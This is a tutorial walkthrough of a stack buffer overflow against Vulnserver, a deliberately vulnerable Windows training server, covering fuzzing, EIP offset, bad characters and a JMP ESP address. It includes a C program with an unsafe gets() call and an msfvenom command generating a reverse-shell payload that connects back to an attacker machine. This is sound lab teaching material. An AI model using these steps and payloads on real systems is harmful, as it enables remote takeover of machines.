# :game_die: Stack Based Buffer Overflow Practical For Windows (Vulnserver)

---

# Stack Based Buffer Overflow Practical For Windows (Vulnserver)

By Shamsher Khan, vulnserver Buffer Overflow attack with TRUN command

Buffers are memory storage regions that temporarily hold data while it is transferred from one location to another. A buffer overflow occurs when the volume of data exceeds the storage capacity of the memory buffer. As a result, the program attempting to write the data to the buffer overwrites adjacent memory locations.

Image Credits: [https://www.hackingtutorials.org](https://www.hackingtutorials.org)

It is a critical vulnerability that lets someone access your important memory locations. A hacker can insert his malicious script and gain access to the machine. Here is a picture that shows where a stack is located, which will be the place of exploitation. Heap is like a free-floating region of memory.

Image Source: Google

Now let us try understanding the stack hierarchy. Stack hierarchy has extended stack pointer (ESP), Buffer space, extended base pointer (EBP), and extended instruction pointer (EIP).

ESP holds the top of the stack. It points to the most-recently pushed value on the stack. A stack buffer is a temporary location created within a computer’s memory for storing and retrieving data from the stack. EBP is the base pointer for the current stack frame. EIP is the instruction pointer. It points to (holds the address of) the first byte of the next instruction to be executed.

Stack

Stack: A LIFO data structure extensively used by computers in memory management, etc.

There is a bunch of registers present in the memory, but we will only concern ourselves with EIP, EBP, and ESP.

EBP: It’s a stack pointer that points to the base of the stack.

ESP: It’s a stack pointer that points to the top of the stack.

EIP: It contains the address of the next instruction to be executed

Imagine if we send a bunch of characters into the buffer. It should stop taking in characters when it reaches the end. But what if the character starts overwriting EBP and EIP? This is where a buffer overflow attack comes into place. If we can access the EIP, we could insert malicious scripts to gain control of the computer.

Let’s see some important points related to the stack:

A stack is filled from higher memory to lower memory.
In a stack, all the variables are accessed relative to the EBP.
In a program, every function has its own stack.
Everything is referenced from the EBP register.

There are 4 main components of the memory stack in a 32-bit architecture -

Extended Stack Pointer (ESP)
Buffer Space
Extended Base Pointer (EBP)
Extended Instruction Pointer (EIP) / Return Address

## Definitions:

- EIP =>The Extended Instruction Pointer (EIP) is a register that contains the address of the next instruction for the program or command.

- ESP=>The Extended Stack Pointer (ESP) is a register that lets you know where on the stack you are and allows you to push data in and out of the application.

- JMP =>The Jump (JMP) is an instruction that modifies the flow of execution where the operand you designate will contain the address being jumped to.

- \x41, \x42, \x43 =>The hexadecimal values for A, B and C. For this exercise, there is no benefit to using hex vs ascii, it’s just my personal preference.

For now, we will only to be concerned with ‘Buffer Space’ and the ‘EIP’.

Buffer space is used as a storage area for memory in programming languages. For security reasons, information placed into the buffer space should never travel outside the buffer space

In the above figure, consider that a number of A’s (0x41) were sent to the buffer space, but were correctly sanitized. The A’s did not travel outside the buffer space and thus, no buffer overflow occurred.

Now, looking at a buffer overflow -

In the above figure, the number of A’s (0x41) that were sent to the buffer space, have traveled outside the buffer space and have reached till the EIP.

If an attacker can gain control of the EIP, he or she can use the pointer to point to some malicious code and compromise a system. We are going to demonstrate how to do it.

Types of Buffer Overflow Attacks

Stack-based buffer overflows are more common, and leverage stack memory that only exists during the execution time of a function.

Heap-based attacks are harder to carry out and involve flooding the memory space allocated for a program beyond memory used for current runtime operations.

What Programming Languages are More Vulnerable?

C and C++ are two languages that are highly susceptible to buffer overflow attacks, as they don’t have built-in safeguards against overwriting or accessing data in their memory. Mac OSX, Windows, and Linux all use code written in C and C++.

Languages such as PERL, Java, JavaScript, and C# use built-in safety mechanisms that minimize the likelihood of buffer overflow.

How to Prevent Buffer Overflows

Developers can protect against buffer overflow vulnerabilities via security measures in their code, or by using languages that offer built-in protection.

In addition, modern operating systems have runtime protection. Three common protections are:

Address space randomization (ASLR) — randomly moves around the address space locations of data regions. Typically, buffer overflow attacks need to know the locality of executable code, and randomizing address spaces makes this virtually impossible.

Data execution prevention — flags certain areas of memory as non-executable or executable, which stops an attack from running code in a non-executable region.

Structured exception handler overwrite protection (SEHOP) — helps stop malicious code from attacking Structured Exception Handling (SEH), a built-in system for managing hardware and software exceptions. It thus prevents an attacker from being able to make use of the SEH overwrite exploitation technique. At a functional level, an SEH overwrite is achieved using a stack-based buffer overflow to overwrite an exception registration record, stored on a thread’s stack.

## Lets Take an Example How Buffer Overflow Work with Simple C program

```
#include<stdio.h>
#include<string.h>int main(void)
{
char buff[15];
int pass = 0;printf("\n Enter the password : \n");
gets(buff);if(strcmp(buff, "mrsam"))
{
printf("\n Wrong Password \n");
}
else
{
printf("\n Correct Password \n");
pass = 1;
}if(pass)
{
/* Now Give root or admin rights to user*/
printf("\n Root privileges given to the user \n");
char command[50];
strcpy( command, "ls -l" );
system(command);
}return 0;
}
```

This is simple Login system program the correct password of this program is mrsam

compile your code

```
gcc program.c -o program
```

as you can when give correct password=mrsam it will run “ls -l”

command

Now run this program again with wrong password

When i enter wrong password the program not running “ls -l” command

Now run this program again with wrong password with more then character

In the above example, even after entering a wrong password, the program worked as you gave the correct password.

There is a logic behind the output above. What attacker did was, he/she supplied an input of length greater than what buffer can hold and at a particular length of input the buffer overflow so took place that it overwrote the memory of integer ‘pass’. So despite of a wrong password, the value of ‘pass’ became non zero and hence root privileges were granted to an attacker.

### What is Vulnserver?

Vulnserver was created for learning software exploitation. It is a multi-threaded Windows based TCP server that listens for client connections on port 9999 (by default) and allows the user to run a number of different commands that are vulnerable to various types of buffer overflow exploiations. The source code can be found [here](https://github.com/stephenbradshaw/vulnserver).

Tools/OS used :

```
Attacker Machine : Kali Linux Rolling
Victim Host : Windows 7 ultimate 32 bit
Vulnserver application ([github](https://github.com/stephenbradshaw/vulnserver))
Immunity Debugger v1.85
```

NOTES :-

```
Attacker’s IP : 192.168.43.73
Victim’s IP : 192.168.43.112
Vulnerable port : 9999 ( Vulnserver )
Vulnerable parameter : TRUN
```

EASY STEPSPart 1

- Fuzzing the service parameter and getting the crash byte

- Generating the pattern

- Finding the correct offset where the byte crashes with the help of (EIP)

Part 2

- Finding the bad character with mona.py, and comparing bad character strings with mona.py

- Finding return address (JMP ESP) with mona.py

Part 3

- Setting breakpoint to verify RETURN address is correct or not

- Creating reverse shell with the help of msfvenom

- Adding NOP’s to the script

- Getting shell

Right click on vulnserver run as Administrator by default vulnserver is running on port 9999

so you can see that above image vulnserver is running on port 9999

## Fuzzing

The first step in testing for a buffer overflow is fuzzing.
Fuzzing allows us to send bytes of data to a vulnerable program (in our case, Vulnserver) in growing iterations, to overflow the buffer space and overwrite the EIP.

From here we see the commands that are available to us. Here’s where things are going to get interesting, we’re going to fuzz some commands to find out where it crashes. I’m going to use the TRUN command, though any of the commands are viable test subjects

So this is manual Fuzzing it will take long time to crash the program

So here we will use Python Script

Now, let’s write a simple Python fuzzing script on our Linux machine [fuzzing.py](https://github.com/shamsherkhan852/Buffer-Overflow-tools)Download from

It should be noted that the IP in the s.connect() will be of the Windows machine that is running Vulnserver and it runs on port 9999 by default, and the vulnerability we are attacking is through the “TRUN” command.

Now, in Immunity Debugger click on ‘File’ > and select vulnserver.exe.

Run the vulnserver.exe program by clicking the play button.

Wait till the program crashes and you see the ‘Paused’ status at the bottom right of Immunity Debugger.

In my case, vulnserver crashed after 5900 bytes. Also, not all registers were overwritten by ‘A’ (0x41), and that’s not a problem unless the program has crashed. We now have a general idea of sending data to crash the program. See the Image below

What we need to do next is figure out exactly where the EIP is located (in bytes) and try to get control over it.

## Finding the Offset

So, now that we know how we can overwrite the EIP and that the overwrite occurred between 1 and 5900 bytes- .

## Get Shamsher khan’s stories in your inbox

Join Medium for free to get updates from this writer.

Remember me for faster sign in

We use 2 Ruby tools : ‘Pattern Create’ and ‘Pattern Offset’ to find the exact location of the overwrite.

Pattern Create allows us to generate some amount of bytes, based on the number of bytes specified. We can then send those bytes to Vulnserver instead of A’s, and try to find exactly where we overwrote the EIP. Pattern Offset will help us determine the location of the overwrite soon.

In Kali, by default, these tools are located in the /usr/share/metasploit-framework/tools/exploit folder.

We will write a new offest-value.py and create a new variable ‘shellcode’ containing the string generated above.

[Download offset_value.py](https://github.com/shamsherkhan852/Buffer-Overflow-tools)

We just need to send this code only once.

Now, in Immunity Debugger click on ‘File’ > and select vulnserver.exe.

Run the vulnserver.exe program by clicking the play button.

Observing the EIP register -‘386F4337’. This value is actually part of our script that we generated using the Pattern Create tool.

To find out the location we will be using Pattern Offset tool.

Well, we now know the exact location from where the EIP begins and we can now try to control the EIP, which will be very useful in our exploit.

We will now move on to Overwriting the EIP.

Overwriting the EIP

Now that we know the EIP starts at 2003 bytes, we can modify our code to confirm that.

It will be like a ‘trial-and-error’ and a ‘proof of concept’ kind.

We will first send 2003 ‘A’s and then send 4 ‘B’s (since EIP is 4 bytes in size).

I hope you all get what we are doing here. Request you all to have a little patience and you will make it through.

The 2003 A’s will just reach (kiss) the EIP but won’t overwrite the EIP but the B’s should overwrite the EIP.

We are just testing it’s range to be doubly sure. That’s it.

Writing a new python script:- [OverwriteEIP.py](https://github.com/shamsherkhan852/Buffer-Overflow-tools)

Now, in Immunity Debugger click on ‘File’ > and select vulnserver.exe.

Run the vulnserver.exe program by clicking the play button.

Observe that, our EIP has the value ‘42424242’ just like we wanted.

Now we will find out which characters are considered as ‘bad characters’ by the Vulnserver application.

By default, the null byte(x00) is always considered a bad character as it will truncate the shellcode when executed.

Finding the Bad Characters

Some characters cause issues in the exploit development. We must run every byte (0–255 in value because 1 byte’s range is 0–255) through the Vulnserver program to see if any characters cause issues.

We already know that the null byte(x00) is always considered a bad character by default.

To find bad characters in Vulnserver, add an additional variable ‘badchars’ to our code that contains a list of every single hexadecimal character, except \x00.

Lets generate Badchars

Feel free to use the above snippet in your code.

Copying the OverwriteEIP.py for backup and creating a new file badchars.py.

Download [badchars.py](https://github.com/shamsherkhan852/Buffer-Overflow-tools)

Now, in Immunity Debugger click on ‘File’ > and select vulnserver.exe.

Run the vulnserver.exe program by clicking the play button.

Right click on the ESP register and select “Follow in Dump”

If a bad character is present, it would immediately seem out of place. But in our case, there are no bad characters in the Vulnserver application.

Observing how neat and perfect is the order of characters. They end at 0xFF.

The great thing about the vulnserver.exe is that only the null byte (0x00) is a bad character.

Finding the right module.

Finding the right module means that we need to find some part of Vulnserver that does not have any sort of memory protections. We will use ‘mona modules’ to find it.

Download mona.py and paste this file that path

Reopen Vulnserver and Immunity Debugger as admin. don’t play server

In the bottom search bar on Immunity enter -

!mona modules

A table will appear having weird numbers all in Green.

Look for ‘False’ across the table. That means there are no memory protections present in that module.

‘essfunc.dll’ is running as part of Vulnserver and has no memory protections. Making a note of it.

Now we will find the opcode equivalent of JMP ESP. We are using JMP ESP because our EIP will point to the JMP ESP location, which will jump to our malicious shellcode that we will inject later.

## Finding Hex Codes for Useful instruction

Kali Linux contains a handy utility for converting assembly language to hex codes.

In Kali Linux, in a Terminal window, execute this command:

>

`*locate nasm_shell*`

The hexadecimal code for a “JMP ESP” instruction is FFE4.

Now we will find the pointer address using this information. We will place this pointer address into the EIP to point to our malicious shellcode.

In our Immunity searchbar enter -

>

*!mona find -s “\xff\xe4” -m essfunc.dll*

```
where -s is the byte string to search for, and -m specifies the module to search in
```

It shows all possible right module

We found 9 locations in memory (that won’t change addresses when we restart program) that hold the instruction ‘JMP ESP’.

It’s a list of addresses that we can potentially use as our pointer. The addresses are located on the left side, in white.

We will select the first address -625011AF and add it to our Python script shell.py

Note 1 : your address may be different depending on the version of Windows you are running. So, do not panic if the addresses are not the same!

The address will be in hex -

\xaf\x11\x50\x62

Try one by one (copy first address=625011af) immunity. click on black right arrow >:

Paste 625011af and ok

right click on 625011AF breakpoint>toggle

now play server

Downlaod [find_right_module.py](https://github.com/shamsherkhan852/Buffer-Overflow-tools)

(it show our copied address on EIP)

if EIP show our copied address then it is right module

Note 2 : This will look a little weird. This is a 32-bit application. That means that the system is using x86’s architecture format of “Little Endian”, or in other words, “Least significant byte first.” We have to use the Little Endian format in x86 architecture because the low-order byte is stored in the memory at the lowest address and the high-order byte is stored at the highest address.

### Generating reverse shell payload -

```
sudo msfvenom -p windows/shell_reverse_tcp LHOST=192.168.43.72 LPORT=1234 EXITFUNC=thread -a x86 --platform windows -b "\x00" -f c
```

Download [exploit.py](https://github.com/shamsherkhan852/Buffer-Overflow-tools)

According to TCM — we must create a variable called ‘exploit’ and place the malicious shellcode inside of it. We must also add ’32 * \x90’ to the shellcode variable (32 \x90 bytes). This is standard practice. The 0x90 byte is also known as the NOP, or no operation. It literally does nothing. However, when developing exploits, we can use it as padding. There are instances where our exploit code can interfere with our return address and not run properly. To avoid this interference, we can add some padding in-between the two items.

Start nc listener on same port mentioned during creation of the payload — 1234.

Restart vulnserver(CTRL+F2) and play server(F9)

Execute shell.py in a new terminal tab.

You can find me on:
LinkedIn:- [https://www.linkedin.com/in/shamsher-khan-651a35162/](https://www.linkedin.com/in/shamsher-khan-651a35162/)
Twitter:- [https://twitter.com/shamsherkhannn](https://twitter.com/shamsherkhannn)
Tryhackme:- [https://tryhackme.com/p/Shamsher](https://tryhackme.com/p/Shamsher)

For more walkthroughs stay tuned…
Before you go…

Click Here To Join Telegram
[https://t.me/tryhackme_writeups](https://t.me/tryhackme_writeups)

Visit my other walkthrough’s:-

https://infosecwriteups.com/tryhackme-oscp-buffer-overflow-prep-overflow-1-19e000482f27

and thank you for taking the time to read my walkthrough.
If you found it helpful, please hit the 👏 button 👏 (up to 40x) and share
it to help others with similar interests! + Feedback is always welcome!

---
